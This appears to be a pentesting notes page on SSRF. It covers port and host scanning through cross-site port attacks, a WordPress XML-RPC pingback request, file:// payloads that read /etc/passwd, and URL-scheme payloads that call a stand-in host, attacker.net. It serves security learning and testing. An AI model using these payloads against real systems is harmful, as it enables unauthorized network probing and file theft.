# SSRF (II)

****

## XSPA (Cross Site Port Attack) <a href="#xspa" id="xspa"></a>

Cross-site Port Attacks (XSPA) are very common in which the hacker injects the malicious script to retrieve information on TCP ports and IP addresses. XSTA allows attackers to abuse available functionality in most web applications to port scan intranet and external Internet facing servers, fingerprint internal (non-Internet exposed) network aware services, perform banner grabbing, identify web application frameworks, exploit vulnerable programs, run code on reachable machines, exploit web application vulnerabilities listening on internal networks, read local files using the file protocol and much more.

### General

For more general cases, it is recommended to use Burpsuite's Intruder to "scan" and filter through all open ports on a machine:

```
127.0.0.1:21
127.0.0.1:5985
```

In addition to scanning ports, an attacker could also run a scan of running hosts trying to ping private IP addresses:

```bash
192.168.0.0/16 # More common
172.17.0.0/16 # Docker segment
172.16.0.0/12
10.0.0.0/8
```

### WordPress

For WordPress, XMLRPC is used along with its pingback mechanism to bypass any IP masquerading, such as a basic WAF like Cloudflare.

In an XSPA attack, the hacker uses the pingback. ping method to pingback a post on a target website which, in turn, sends the IP address as a response. The hacker uses a sniffer to create the endpoint to send the pingback and a live URL of a blog post.

The hackers send the following request from their server:

```bash
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```

If the response contains a fault code and a value greater than 0 then it means the port is open for you to start sending the HTTP packets directly.

{% embed url="https://www.valters.eu/wordpress-cross-site-port-attack-xspa" %}

### **Time-Based XSPA**

{% embed url="https://www.elladodelmal.com/2016/05/time-based-xspa-cross-site-port-attack.html" %}

## **Accessing Internal Files via URL Scheme**

Attacking the URL scheme allows an attacker to fetch files from a server and attack internal services:

```bash
file:///etc/passwd
file://\/\/etc/passwd
file://path/to/file
```

## **Accessing Internal Services via URL Scheme**

With an SSRF vulnerability, we can try to connect to certain services by changing the URL scheme. Examples for file transfer protocols:

```bash
ftp://attacker.net:11211/
sftp://attacker.net:11111/
tftp://attacker.net:123456/TESTUDP
```

## Obtaining Access to Cloud Provider Metadata

Work in progress.\
